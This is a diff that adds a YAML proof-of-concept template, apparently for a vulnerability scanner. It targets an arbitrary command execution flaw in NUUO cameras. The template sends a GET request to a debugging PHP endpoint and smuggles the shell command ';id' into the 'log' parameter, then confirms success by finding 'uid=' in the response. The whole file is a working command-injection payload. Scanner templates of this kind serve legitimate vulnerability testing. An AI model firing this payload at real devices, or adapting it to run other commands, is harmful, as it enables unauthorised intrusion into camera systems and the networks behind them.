@@ -1,0 +1,9 @@
+name: poc-yaml-NUUO摄像头-cmd
+description: "任意命令执行"
+method: GET
+path:
+  - /__debugging_center_utils___.php?log=;id
+expression:
+  status: 200
+  body_any:
+    - "uid="
